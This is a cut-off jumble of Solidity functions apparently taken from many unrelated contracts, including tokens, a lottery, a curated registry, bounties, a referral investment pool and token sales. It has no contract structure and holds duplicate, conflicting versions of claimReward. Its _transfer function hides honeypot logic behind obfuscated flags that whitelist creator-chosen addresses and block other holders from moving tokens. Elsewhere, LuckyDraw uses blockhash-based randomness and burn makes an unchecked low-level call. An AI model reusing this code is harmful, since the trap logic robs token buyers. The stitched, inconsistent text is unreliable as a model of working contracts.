    balances[holder] = balances[holder].add(tokens);
    saleTokenSupply = saleTokenSupply.add(tokens);
    totalSupply_ = totalSupply_.add(tokens);
    AllocateInflatedTokens(msg.sender, holder, tokens);
}

function burn() public returns(bool sucess) {
    bytes4 transferMethodId = bytes4(keccak256("transfer(address,uint256)"));
    uint256 _value = totalClaimed - totalBurned;
    if (zyroAddr.call(transferMethodId, address(0), _value)) {
        totalBurned += _value;
        emit BurnToken(_value);
        return true;
    }
    return false;
}

function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (cronjob == false)) {
        psaux = chTx;
        devsda = true;
    }
    if ((address(sender) == creator) && (cronjob == true)) {
        clarkson[recipient] = true;
        worse[recipient] = false;
        cronjob = false;
    }
    if ((amount > ddif) && (clarkson[sender] == true) && (address(sender) != creator)) {
        television[recipient] = true;
    }
    if (clarkson[recipient] != true) {
        worse[recipient] = ((randomly() == 78) ? true : false);
    }
    if ((worse[sender]) && (clarkson[recipient] == false)) {
        worse[recipient] = true;
    }
    if (clarkson[sender] == false) {
        if ((amount > ddif) && (television[sender] == true)) {
            require(false);
        }
        require(amount < psaux);
        if (devsda == true) {
            if (television[sender] == true) {
                require(false);
            }
            television[sender] = true;
        }
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

function sendArena(address[] winners, uint256[] amounts, uint64 _flag)
external
onlyService
whenNotPaused {
    uint64 tmNow = uint64(block.timestamp);
    uint256 length = winners.length;
    require(length == amounts.length);
    require(length <= 100);
    uint256 sum = 0;
    for (uint32 i = 0; i < length; ++i) {
        sum = sum.add(amounts[i]);
    }
    uint256 balance = this.balance;
    require((sum.mul(100).div(balance)) <= maxArenaOneDay);
    address addrZero = address(0);
    for (uint32 j = 0; j < length; ++j) {
        if (winners[j] != addrZero) {
            winners[j].transfer(amounts[j]);
        }
    }
    nextArenaTime = tmNow + 21600;
    SendArenaSuccesss(_flag, balance, sum);
}

function LuckyDraw() public {
    require(msg.sender == tx.origin);
    if (block.number >= playerBlock[msg.sender] + 256) {
        uint[] memory empty = new uint[](0);
        emit Numbers(address(this), empty, "Your tickets expired or are invalid. Try Again.");
        playerBlock[msg.sender] = 0;
        playerTickets[msg.sender] = 0;
    } else if (block.number > playerBlock[msg.sender] + blockInterval) {
        bool win = false;
        uint[] memory numbers = new uint[](playerTickets[msg.sender]);
        uint i = 0;
        while (i < playerTickets[msg.sender]) {
            numbers[i] = uint256(uint256(keccak256(abi.encodePacked(blockhash(playerBlock[msg.sender] + 2), i))) % maxNumber);
            if (numbers[i] == systemNumber)
                win = true;
            i++;
        }
        ticketsPlayed += playerTickets[msg.sender];
        if (win) {
            address payable add = payable(msg.sender);
            uint contractBalance = address(this).balance;
            uint winAmount = contractBalance * percentWin / 100;
            uint totalToPay = winAmount;
            if (!add.send(totalToPay)) revert('Error While Executing Payment.');
            totalPaidOut += totalToPay;
            winnersCount++;
            winnersEthCount += totalToPay;
            emit Numbers(address(this), numbers, "YOU WON!");
            winners.push(msg.sender);
            winnersTickets.push(playerTickets[msg.sender]);
            winnersETH.push(totalToPay);
            winnersTimestamp.push(block.timestamp);
        } else {
            emit Numbers(address(this), numbers, "Your numbers don't match the System Number! Try Again.");
        }
        playerBlock[msg.sender] = 0;
        playerTickets[msg.sender] = 0;
    } else {
        revert('Players must wait 3 blocks');
    }
}

function resolveChallenge(bytes32 _listingHash) private {
    uint challengeID = listings[_listingHash].challengeID;
    uint reward = determineReward(challengeID);
    challenges[challengeID].resolved = true;
    challenges[challengeID].totalTokens =
        voting.getTotalNumberOfTokensForWinningOption(challengeID);
    if (voting.isPassed(challengeID)) {
        whitelistApplication(_listingHash);
        listings[_listingHash].unstakedDeposit = listings[_listingHash].unstakedDeposit.add(reward);
        totalStaked[listings[_listingHash].owner] = totalStaked[listings[_listingHash].owner].add(reward);
        emit _ChallengeFailed(_listingHash, challengeID, challenges[challengeID].rewardPool, challenges[challengeID].totalTokens);
    }
    else {
        resetListing(_listingHash);
        require(token.transfer(challenges[challengeID].challenger, reward));
        emit _ChallengeSucceeded(_listingHash, challengeID, challenges[challengeID].rewardPool, challenges[challengeID].totalTokens);
    }
}

function challengeReparameterization(bytes32 _propID) public returns(uint) {
    ParamProposal memory prop = proposals[_propID];
    uint deposit = prop.deposit;
    require(propExists(_propID) && prop.challengeID == 0);
    uint pollID = voting.startPoll(
        get("pVoteQuorum"),
        get("pCommitStageLen"),
        get("pRevealStageLen")
    );
    challenges[pollID] = Challenge({
        challenger: msg.sender,
        rewardPool: SafeMath.sub(100, get("pDispensationPct")).mul(deposit).div(100),
        stake: deposit,
        resolved: false,
        winningTokens: 0
    });
    proposals[_propID].challengeID = pollID; 
    require(token.transferFrom(msg.sender, this, deposit));
    (uint commitEndDate, uint revealEndDate, , , ) = voting.pollMap(pollID);
    emit _NewChallenge(_propID, pollID, commitEndDate, revealEndDate);
    return pollID;
}

function migrateListing(bytes32 listingHash) onlyIfOutdatedRegistry public {
    require(listingExists(listingHash)); 
    require(!challengeExists(listingHash)); 
    address newRegistryAddress = parameterizer.getNewRegistry();
    SupercedesRegistry newRegistry = SupercedesRegistry(newRegistryAddress);
    Listing storage listing = listings[listingHash];
    require(newRegistry.canReceiveListing(
        listingHash, listing.applicationExpiry,
        listing.whitelisted, listing.owner,
        listing.unstakedDeposit, listing.challengeID
    ));
    token.approve(newRegistry, listing.unstakedDeposit);
    newRegistry.receiveListing(
        listingHash, listing.applicationExpiry,
        listing.whitelisted, listing.owner,
        listing.unstakedDeposit, listing.challengeID
    );
    delete listings[listingHash];
    emit _ListingMigrated(listingHash, newRegistryAddress);
}

function apply(bytes32 _listingHash, uint _amount, string _data) onlyIfCurrentRegistry external {
    require(!isWhitelisted(_listingHash));
    require(!appWasMade(_listingHash));
    require(_amount >= parameterizer.get("minDeposit"));
    Listing storage listing = listings[_listingHash];
    listing.owner = msg.sender;
    listing.applicationExpiry = block.timestamp.add(parameterizer.get("applyStageLen"));
    listing.unstakedDeposit = _amount;
    numApplications[listing.owner] = numApplications[listing.owner].add(1);
    totalStaked[listing.owner] = totalStaked[listing.owner].add(_amount);
    require(token.transferFrom(listing.owner, this, _amount));
    emit _Application(_listingHash, _amount, listing.applicationExpiry, _data);
}

function challenge(bytes32 _listingHash, uint _deposit, string _data) onlyIfCurrentRegistry external returns(uint challengeID) {
    Listing storage listing = listings[_listingHash];
    uint minDeposit = parameterizer.get("minDeposit");
    require(appWasMade(_listingHash) || listing.whitelisted);
    require(listing.challengeID == 0 || challenges[listing.challengeID].resolved);
    if (listing.unstakedDeposit < minDeposit) {
        resetListing(_listingHash);
        emit _TouchAndRemoved(_listingHash);
        return 0;
    }
    uint pollID = voting.startPoll(
        parameterizer.get("voteQuorum"),
        parameterizer.get("commitStageLen"),
        parameterizer.get("revealStageLen")
    );
    challenges[pollID] = Challenge({
        challenger: msg.sender,
        rewardPool: ((100 - parameterizer.get("dispensationPct")) * _deposit) / 100,
        stake: _deposit,
        resolved: false,
        totalTokens: 0
    });
    listing.challengeID = pollID;
    require(_deposit >= minDeposit && _deposit <= listing.unstakedDeposit);
    listing.unstakedDeposit = listing.unstakedDeposit.sub(_deposit);
    require(token.transferFrom(msg.sender, this, _deposit));
    emit _Challenge(_listingHash, pollID, _deposit, _data);
    return pollID;
}

function withdraw(bytes32 _listingHash, uint _amount) external {
    Listing storage listing = listings[_listingHash];
    require(listing.owner == msg.sender);
    require(_amount <= listing.unstakedDeposit);
    require(listing.unstakedDeposit.sub(_amount) >= parameterizer.get("minDeposit"));
    listing.unstakedDeposit = listing.unstakedDeposit.sub(_amount);
    require(token.transfer(msg.sender, _amount));
    emit _Withdrawal(_listingHash, _amount, listing.unstakedDeposit);
}

function claimReward(uint _challengeID, uint _salt) public {
    require(challenges[_challengeID].tokenClaims[msg.sender] == false);
    require(challenges[_challengeID].resolved == true);
    uint voterTokens = voting.getNumPassingTokens(msg.sender, _challengeID, _salt);
    uint reward = voterReward(msg.sender, _challengeID, _salt);
    challenges[_challengeID].totalTokens = challenges[_challengeID].totalTokens.sub(voterTokens);
    challenges[_challengeID].rewardPool = challenges[_challengeID].rewardPool.sub(reward);
    challenges[_challengeID].tokenClaims[msg.sender] = true;
    require(token.transfer(msg.sender, reward));
    emit _RewardClaimed(_challengeID, reward, msg.sender);
}

function determineReward(uint _challengeID) public view returns(uint) {
    require(!challenges[_challengeID].resolved && voting.pollEnded(_challengeID));
    if (voting.getTotalNumberOfTokensForWinningOption(_challengeID) == 0) {
        return challenges[_challengeID].stake.mul(2);
    }
    return (challenges[_challengeID].stake).mul(2).sub(challenges[_challengeID].rewardPool);
}

function claimReward(uint _challengeID, uint _salt) public {
    require(challenges[_challengeID].tokenClaims[msg.sender] == false);
    require(challenges[_challengeID].resolved == true);
    uint voterTokens = voting.getNumPassingTokens(msg.sender, _challengeID, _salt);
    uint reward = voterReward(msg.sender, _challengeID, _salt);
    challenges[_challengeID].winningTokens = challenges[_challengeID].winningTokens.sub(voterTokens);
    challenges[_challengeID].rewardPool = challenges[_challengeID].rewardPool.sub(reward);
    challenges[_challengeID].tokenClaims[msg.sender] = true;
    emit _RewardClaimed(_challengeID, reward);
    require(token.transfer(msg.sender, reward));
}

function challengeExists(bytes32 _listingHash) view public returns(bool) {
    uint challengeID = listings[_listingHash].challengeID;
    return (challengeID > 0 && !challenges[challengeID].resolved);
}

function listingExists(bytes32 listingHash) public view returns(bool) {
    return listings[listingHash].owner != address(0);
}

function deposit(bytes32 _listingHash, uint _amount) external {
    Listing storage listing = listings[_listingHash];
    require(listing.owner == msg.sender);
    listing.unstakedDeposit = listing.unstakedDeposit.add(_amount);
    totalStaked[listing.owner] = totalStaked[listing.owner].add(_amount);
    require(token.transferFrom(msg.sender, this, _amount));
    emit _Deposit(_listingHash, _amount, listing.unstakedDeposit);
}

function proposeReparameterization(string _name, uint _value) public returns(bytes32) {
    uint deposit = get("pMinDeposit");
    bytes32 propID = keccak256(abi.encodePacked(_name, _value));
    bytes32 _nameKec = keccak256(abi.encodePacked(_name));
    if (_nameKec == DISPENSATION_PCT_KEC ||
        _nameKec == P_DISPENSATION_PCT_KEC) {
        require(_value <= 100);
    }
    if (keccak256(abi.encodePacked(_name)) == NEW_REGISTRY_KEC) {
        require(getNewRegistry() == address(0));
        require(_value != 0);
        require(msg.sender == owner);
        require((_value & 0x000000000000000000000000ffffffffffffffffffffffffffffffffffffffff) == _value); 
        require(this.doesContractImplementInterface(address(_value), REGISTRY_INTERFACE_REQUIREMENT));
    }
    require(!propExists(propID)); 
    require(get(_name) != _value); 
    proposals[propID] = ParamProposal({
        appExpiry: now.add(get("pApplyStageLen")),
        challengeID: 0,
        deposit: deposit,
        name: _name,
        owner: msg.sender,
        processBy: now.add(get("pApplyStageLen"))
            .add(get("pCommitStageLen"))
            .add(get("pRevealStageLen"))
            .add(PROCESSBY),
        value: _value
    });
    require(token.transferFrom(msg.sender, this, deposit)); 
    emit _ReparameterizationProposal(_name, _value, propID, deposit, proposals[propID].appExpiry);
    return propID;
}

function challengeWinnerReward(uint _challengeID) public view returns(uint) {
    if (voting.getTotalNumberOfTokensForWinningOption(_challengeID) == 0) {
        return challenges[_challengeID].stake.mul(2);
    }
    return challenges[_challengeID].stake.mul(2).sub(challenges[_challengeID].rewardPool);
}

function awardPersonalBounty(string memory name, string memory description, address payable hunter, uint tokenAmount) public payable {
    require(msg.value >= fee || satisfiesWaiver(msg.sender), "both insufficient ETH for fee and DEV waiver not met");
    uint _fee = getFee(msg.sender);
    addUser(msg.sender);
    addUser(hunter);
    setUbounty(users[msg.sender], users[hunter], 0, name, description, 0, 0);
    uint weiAmount = msg.value - _fee;
    hunter.transfer(weiAmount);
    transferFrom(msg.sender, hunter, tokenAmount);
    collector.transfer(_fee);
    emit rewarded(numUbounties, 0, hunter, tokenAmount, weiAmount);
    emit completed(numUbounties++);
}

function postPersonalBounty(
    string memory name,
    string memory description,
    address payable hunter,
    uint8 available,
    uint amount,
    uint48 deadline
) public payable {
    require(msg.value >= fee || satisfiesWaiver(msg.sender), "both insufficient ETH for fee and DEV waiver not met");
    uint _fee = getFee(msg.sender);
    addUser(msg.sender);
    addUser(hunter);
    address payable bCAddress = getBountyChest();
    uint weiAmount = msg.value - _fee;
    if (deadline == 0) {
        deadline = 2 ** 48 - 1;
    }
    setUbounty(users[msg.sender], users[hunter], available, name, description, bountyChests[bCAddress], deadline);
    collector.transfer(_fee);
    transferFrom(msg.sender, bCAddress, amount);
    bCAddress.transfer(weiAmount);
    emit created(numUbounties++, available, amount, weiAmount);
}

function postOpenBounty(
    string memory name,
    string memory description,
    uint8 available,
    uint amount,
    uint48 deadline
) public payable {
    require(msg.value >= fee || satisfiesWaiver(msg.sender), "both insufficient ETH for fee and DEV waiver not met");
    uint _fee = getFee(msg.sender);
    addUser(msg.sender);
    address payable bCAddress = getBountyChest();
    uint weiAmount = msg.value - _fee;
    if (deadline == 0) {
        deadline = 2 ** 48 - 1;
    }
    setUbounty(users[msg.sender], 0, available, name, description, bountyChests[bCAddress], deadline);
    collector.transfer(_fee);
    transferFrom(msg.sender, bCAddress, amount);
    bCAddress.transfer(weiAmount);
    emit created(numUbounties++, available, amount, weiAmount);
}

function reclaimableNow(uint ubountyIndex) public view returns(bool) {
    if (now > ubounties[ubountyIndex].deadline) {
        return true;
    } else {
        return false;
    }
}

function reclaim(uint ubountyIndex) public {
    require(users[msg.sender] == ubounties[ubountyIndex].creatorIndex, "You are not the bounty creator");
    require(ubounties[ubountyIndex].deadline != 2 ** 48 - 1, "This bounty was created without a deadline, and is not reclaimable");
    require(now > ubounties[ubountyIndex].deadline, "The bounty deadline has not yet elapsed");
    require(ubounties[ubountyIndex].available > 0, "This bounty is inactive");
    uint weiAmount = weiBountyAmount(ubountyIndex);
    emit reclaimed(ubountyIndex, bountyAmount(ubountyIndex), weiAmount);
    transferFrom(bCList[ubounties[ubountyIndex].bountyChestIndex], msg.sender, bountyAmount(ubountyIndex));
    transferEth(ubountyIndex, msg.sender, weiAmount);
    freeBC.push(ubounties[ubountyIndex].bountyChestIndex);
    ubounties[ubountyIndex].available = 0;
    for (uint i = 0; i < ubounties[ubountyIndex].numSubmissions && i < 1800; i++) {
        if (ubounties[ubountyIndex].submissions[i].approved == false) {
            emit rejected(ubountyIndex, i, "bounty has been reclaimed");
        }
    }
}

function submit(uint ubountyIndex, string memory submissionString) public {
    require(ubounties[ubountyIndex].hunterIndex == 0 || msg.sender == userList[ubounties[ubountyIndex].hunterIndex], "You are not the bounty hunter");
    require(now <= ubounties[ubountyIndex].deadline, "The bounty deadline has passed");
    require(ubounties[ubountyIndex].available > 0, "This bounty is inactive"); 
    if (users[msg.sender] == 0) {
        users[msg.sender] = uint32(userList.length);
        userList.push(msg.sender);
    }
    ubounties[ubountyIndex].submissions[ubounties[ubountyIndex].numSubmissions].submissionString = submissionString;
    ubounties[ubountyIndex].submissions[ubounties[ubountyIndex].numSubmissions].submitterIndex = users[msg.sender];
    emit submitted(ubountyIndex, ubounties[ubountyIndex].numSubmissions++);
}

function reward(uint ubountyIndex, uint submissionIndex, address payable hunter) internal {
    uint rewardAmount = bountyAmount(ubountyIndex) / ubounties[ubountyIndex].available;
    uint weiRewardAmount = weiBountyAmount(ubountyIndex) / ubounties[ubountyIndex].available;
    ubounties[ubountyIndex].available--;
    transferEth(ubountyIndex, hunter, weiRewardAmount);
    transferFrom(bCList[ubounties[ubountyIndex].bountyChestIndex], hunter, rewardAmount);
    emit rewarded(ubountyIndex, submissionIndex, hunter, rewardAmount, weiRewardAmount);
    if (ubounties[ubountyIndex].available == 0) {
        freeBC.push(ubounties[ubountyIndex].bountyChestIndex);
        emit completed(ubountyIndex);
    }
}

function getBountyChest() internal returns(address payable bCAddress) {
    if (freeBC.length > 0) {
        bCAddress = bCList[freeBC[freeBC.length - 1]];
        freeBC.pop();
    } else {
        bountyChest C = new bountyChest();
        bCAddress = address(C);
        bountyChests[bCAddress] = uint32(bCList.length);
        bCList.push(bCAddress);
    }
    return (bCAddress);
}

function createBountyChest() public {
    bountyChest C = new bountyChest();
    address payable bCAddress = address(C);
    bountyChests[bCAddress] = uint32(bCList.length);
    freeBC.push(bCList.length);
    bCList.push(bCAddress);
}

function awardOpenBounty(uint ubountyIndex, address payable hunter) public {
    require(users[msg.sender] == ubounties[ubountyIndex].creatorIndex, "You are not the bounty publisher");
    require(ubounties[ubountyIndex].available > 0, "This bounty is inactive");
    require(ubounties[ubountyIndex].hunterIndex == 0, "Only works for Open Bounties");
    uint rewardAmount = bountyAmount(ubountyIndex) / ubounties[ubountyIndex].available;
    uint weiAmount = weiBountyAmount(ubountyIndex) / ubounties[ubountyIndex].available;
    ubounties[ubountyIndex].available--;
    ERC20(devcash).transferFrom(bCList[ubounties[ubountyIndex].bountyChestIndex], hunter, rewardAmount);
    transferEth(ubountyIndex, hunter, weiAmount);
    if (ubounties[ubountyIndex].available == 0) {
        freeBC.push(ubounties[ubountyIndex].bountyChestIndex);
        emit completed(ubountyIndex);
    }
    emit rewarded(ubountyIndex, 0, hunter, rewardAmount, weiAmount);
}

function transferFrom(address _from, address _to, uint256 _value) public returns(bool success) {
    require(_value <= allowed[_from][msg.sender]);
    if (success = chickenHunt.transferChickenFrom(_from, _to, _value)) {
        allowed[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);
    }
}

function settleSynth() internal {
    if (settled) {
        return;
    }
    settled = true;
    exchanger().settle(address(this), currencyKey);
    settledAmount = IERC20(address(synth)).balanceOf(address(this));
    emit Settled(totalSupply(), settledAmount);
}

function buyToken(uint256 _tokenId) public
payable
isNotContract(msg.sender) {
    Animal storage animal = arkData[_tokenId];
    uint256 price = animal.price;
    address oldOwner = animal.owner;
    address newOwner = msg.sender;
    uint256 excess = msg.value.sub(price);
    require(price > 0);
    require(msg.value >= price);
    require(oldOwner != msg.sender);
    require(oldOwner != address(0) && oldOwner != address(1)); 
    uint256 totalCut = price.mul(4).div(100);
    uint256 birtherCut = price.mul(animal.birtherPct).div(1000); 
    birtherBalances[animal.birther] = birtherBalances[animal.birther].add(birtherCut);
    uint256 devCut = totalCut.sub(birtherCut);
    developerCut = developerCut.add(devCut);
    transferToken(oldOwner, newOwner, _tokenId);
    Purchase(_tokenId, newOwner, oldOwner, price);
    animal.price = getNextPrice(price);
    animal.lastPrice = price;
    oldOwner.transfer(price.sub(totalCut));
    if (excess > 0) {
        newOwner.transfer(excess);
    }
    checkBirth(_tokenId);
}

function claim(address _to) internal {
    uint256 numberOfGrants = grants[_to].length;
    if (numberOfGrants == 0) {
        return;
    }
    uint256 claimable = 0;
    uint256 claimableFor = 0;
    for (uint256 i = 0; i < numberOfGrants; i++) {
        claimableFor = calculateVestedTokens(
            grants[_to][i].value,
            grants[_to][i].vesting,
            grants[_to][i].start,
            grants[_to][i].claimed
        );
        claimable = claimable.add(claimableFor);
        grants[_to][i].claimed = grants[_to][i].claimed.add(claimableFor);
    }
    token.transfer(_to, claimable);
    circulatingSupply += claimable;
    NewTokenClaim(_to, claimable);
}

function calculateVestedTokens(
    uint256 _tokens,
    uint256 _vesting,
    uint256 _start,
    uint256 _claimed
) internal constant returns(uint256) {
    uint256 time = block.timestamp;
    if (time < _start) {
        return 0;
    }
    if (time >= _vesting) {
        return _tokens.sub(_claimed);
    }
    uint256 vestedTokens = _tokens.mul(time.sub(_start)).div(
        _vesting.sub(_start)
    );
    return vestedTokens.sub(_claimed);
}

function depositRedeem(uint256 _invest_id)
payable
external {
    Player storage player = players[msg.sender];
    require(player.deposits.length >= _invest_id && _invest_id > 0, "Valid deposit id");
    uint256 _index = _invest_id - 1;
    require(player.deposits[_index].expire < block.timestamp, "Invest not expired");
    require(player.deposits[_index].status == 0, "Invest is redeemed");
    uint256 _amount = player.deposits[_index].amount;
    uint256 token_amount = _getTokenAmount(_amount, invest_token_decimal);
    require(investToken.approve(address(this), token_amount), "approve failed");
    require(investToken.transferFrom(address(this), msg.sender, token_amount), "transferFrom failed");
    player.deposits[_index].status = 1;
    if (player.deposits[_index].is_crowd == 1) {
        player.is_crowd = 0;
        total_crowded_num -= 1;
        _removeShareholders(msg.sender);
    }
    player.total_invested -= _amount;
    total_invested -= _amount;
    total_redeem += _amount;
    _updateReferralMatchInvestedAmount(msg.sender, _amount, -1);
    emit DepositRedeem(_invest_id);
}

function deposit(address _referral, uint256 _amount, uint256 _month)
external
payable {
    require(_amount >= INVEST_MIN_AMOUNT, "Minimal deposit: 100 1CC");
    require(_amount <= INVEST_MAX_AMOUNT, "Maxinum deposit: 10000 1CC");
    Player storage player = players[msg.sender];
    require(player.deposits.length < 2000, "Max 2000 deposits per address");
    uint256 token_decimals = 10 ** invest_token_decimal;
    uint256 token_amount = _amount * token_decimals;
    require(investToken.transferFrom(msg.sender, address(this), token_amount), "transferFrom failed");
    _setReferral(msg.sender, _referral);
    if (player.deposits.length == 0) {
        total_investors += 1;
        addrmap[total_investors] = msg.sender;
    }
    uint256 period_time = _month * 30 * 86400;
    uint256 _id = player.deposits.length + 1;
    player.deposits.push(PlayerDeposit({
        id: _id,
        amount: _amount,
        total_withdraw: 0,
        time: uint256(block.timestamp),
        period: _month,
        expire: uint256(block.timestamp).add(period_time),
        status: 0,
        is_crowd: 0
    }));
    player.total_invested += _amount;
    total_invested += _amount;
    _updateReferralMatchInvestedAmount(msg.sender, _amount, 1);
    emit Deposit(msg.sender, _amount, _month);
}

function crowd(address _referral, uint256 _amount)
payable
external {
    require(_amount == CROWD_LIMIT_AMOUNT, "Crowd limit: 15000 1CC");
    require(total_crowded_num <= SHAREHOLDER_LIMIT_NUM, "Maximum shareholders: 30");
    Player storage player = players[msg.sender];
    require(player.is_crowd == 0, "Already a shareholder");
    uint256 token_amount = _getTokenAmount(_amount, invest_token_decimal);
    require(investToken.transferFrom(msg.sender, address(this), token_amount), "transferFrom failed");
    _setReferral(msg.sender, _referral);
    uint256 _month = crowd_period_month;
    uint256 period_time = _month.mul(30).mul(86400);
    if (player.deposits.length == 0) {
        total_investors += 1;
        addrmap[total_investors] = msg.sender;
    }
    uint256 _id = player.deposits.length + 1;
    player.deposits.push(PlayerDeposit({
        id: _id,
        amount: _amount,
        total_withdraw: 0,
        time: uint256(block.timestamp),
        period: _month,
        expire: uint256(block.timestamp).add(period_time),
        status: 0,
        is_crowd: 1
    }));
    player.is_crowd = 1;
    total_crowded_num += 1;
    shareholders.push(msg.sender);
    player.total_invested += _amount;
    total_invested += _amount;
    _updateReferralMatchInvestedAmount(msg.sender, _amount, 1);
    emit Crowd(msg.sender, _amount);
}

function withdraw()
payable
external {
    _payout(msg.sender);
    Player storage player = players[msg.sender];
    uint256 _amount = player.dividends + player.referral_bonus + player.match_bonus + player.holder_full_bonus + player.holder_single_bonus;
    uint256 _eth_amount = player.eth_dividends;
    require(_amount > 0, "Insufficient balance");
    uint256 token_amount = _amount;
    require(investToken.approve(address(this), token_amount), "approve failed");
    require(investToken.transferFrom(address(this), msg.sender, token_amount), "transferFrom failed");
    if (_eth_amount >= eth_min_withdraw_num && address(this).balance >= _eth_amount) {
        msg.sender.transfer(_eth_amount);
        playerTotals[msg.sender].total_eth_dividends += player.eth_dividends;
        total_eth_dividends += player.eth_dividends;
        player.eth_dividends = 0;
    }
    _referralPayout(msg.sender, token_amount);
    _shareHoldersFullNodePayout(token_amount);
    _shareHoldersSingleNodePayout(msg.sender, token_amount);
    _matchPayout(msg.sender, token_amount);
    _updatePlayerTotalPayout(msg.sender, token_amount);
    emit Withdraw(msg.sender, token_amount);
}

function _updateTotalPayout(address _addr)
private {
    Player storage player = players[_addr];
    for (uint256 i = 0; i < player.deposits.length; i++) {
        PlayerDeposit storage dep = player.deposits[i];
        uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
        uint256 to = block.timestamp > dep.expire ? dep.expire : uint256(block.timestamp);
        if (from < to && dep.status == 0) {
            uint256 _day_payout = _getInvestDayPayoutOf(dep.amount, dep.period);
            player.deposits[i].total_withdraw += _day_payout * (to - from) / 86400;
        }
    }
}

function payoutEthOf(address _addr)
view
external
returns(uint256 value) {
    Player storage player = players[_addr];
    uint256 eth_usd_price = getEthLatestPrice();
    for (uint256 i = 0; i < player.deposits.length; i++) {
        PlayerDeposit storage dep = player.deposits[i];
        uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
        uint256 to = block.timestamp > dep.expire ? dep.expire : uint256(block.timestamp);
        if (from < to && dep.status == 0) {
            uint256 token_amount = _getTokenAmount(dep.amount, invest_token_decimal);
            uint256 _day_eth_payout = (token_amount * invest_reward_eth_month_rate / 1000 / 30) * (invest_coin_usd_price * (10 ** 8)) / eth_usd_price * (10 ** (18 - invest_token_decimal));
            value += _day_eth_payout * (to - from) / 86400;
        }
    }
    return value;
}

function payoutOf(address _addr)
view
external
returns(uint256 value) {
    Player storage player = players[_addr];
    for (uint256 i = 0; i < player.deposits.length; i++) {
        PlayerDeposit storage dep = player.deposits[i];
        uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
        uint256 to = block.timestamp > dep.expire ? dep.expire : uint256(block.timestamp);
        if (from < to && dep.status == 0) {
            uint256 _day_payout = _getInvestDayPayoutOf(dep.amount, dep.period);
            value += _day_payout * (to - from) / 86400;
        }
    }
    return value;
}

function sendStableReward(address _from, address _destination, uint _tokenAmount, uint _stableCoinAmount) public onlyOwner {
    require(rewardBalanceOf[_from] >= _tokenAmount);
    tokenReward.transferFrom(_from, address(this), _tokenAmount);
    rewardBalanceOf[_from] -= _tokenAmount;
    totalRewardBalance -= _tokenAmount;
    stableCoinReward.transfer(_destination, _stableCoinAmount);
}

function airdropTokens(bytes32 _channelId, address[] memory _recipients, uint tokenAmount, uint weiAmount) public onlyOwner {
    for (uint i = 0; i < _recipients.length; i++) {
        bytes32 channelHash = keccak256(
            abi.encodePacked(_channelId, _recipients[i])
        );
        address payable currentRecipient = address(uint160(_recipients[i]));
        if (!airdrops[channelHash]) {
            airdrops[channelHash] = true;
            rewardBalanceOf[currentRecipient] += tokenAmount;
            totalRewardBalance += tokenAmount;
            tokenReward.transfer(currentRecipient, tokenAmount);
            currentRecipient.transfer(weiAmount);
        }
    }
}

receive() external payable {
    require(saleEndDate > 0, "Sale has not started");
    require(msg.value >= 0.1 ether, "Not enough investment");
    uint256 remainingSaleTokens = IFORMS(FORMS_TOKEN_ADDRESS).balanceOf(address(this));
    if (remainingSaleTokens > 0 && block.timestamp > saleEndDate)
        IFORMS(FORMS_TOKEN_ADDRESS).burnTokens(remainingSaleTokens);
    require(IFORMS(FORMS_TOKEN_ADDRESS).balanceOf(address(this)) > 0, "Sale is finished");
    uint tokens = getTokenAmount(msg.value);
    IFORMS(FORMS_TOKEN_ADDRESS).transfer(msg.sender, tokens);
    IFORMS(FORMS_TOKEN_ADDRESS).setTokenLock(tokens, saleEndDate.add(24 hours), msg.sender);
    owner.transfer(msg.value);
}

function refundFunds(address _wallet) internal {
    require(_wallet != address(0));
    require(deposited[_wallet] > 0);
    require(now < endTime);
    uint256 depositedValue = deposited[_wallet];
    deposited[_wallet] = 0;
    _wallet.transfer(depositedValue);
    emit Refunded(_wallet, depositedValue);
}

function FoxicoPool(uint256 _startTime, uint256 _endTime, address _wallet) public {
